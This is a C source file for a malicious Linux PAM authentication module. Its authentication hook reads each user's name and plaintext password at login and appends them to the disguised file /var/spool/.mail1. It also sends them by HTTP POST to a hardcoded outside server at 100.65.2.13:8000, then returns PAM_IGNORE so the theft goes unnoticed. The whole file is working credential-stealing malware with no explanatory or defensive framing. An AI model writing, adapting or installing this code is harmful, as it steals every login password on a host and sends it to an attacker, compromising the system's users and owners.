#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>

#define URL "http://100.65.2.13:8000"
#define OUTFILE "/var/spool/.mail1"	

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
	const char *password;
	const char *user;
	FILE *fp;

	pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
	pam_get_user(pamh, &user, NULL);
	
	//store passwords 
	if (user && password) {
		fp = fopen(OUTFILE, "a");
		if (fp) {
			fprintf(fp, "user:=%s pass=%s\n",user, password);
			fclose(fp);
		}
	}

		
	// init easy session and get a handle
	CURL *curl = curl_easy_init();
	
	 // Build POST data
    	char postfields[512];
    	snprintf(postfields, sizeof(postfields), "username=%s&password=%s", user, password);
	
	// set options
	curl_easy_setopt(curl, CURLOPT_URL, URL);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
	
	curl_easy_perform(curl);
	curl_easy_cleanup(curl);

	return PAM_IGNORE;
	
}


PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
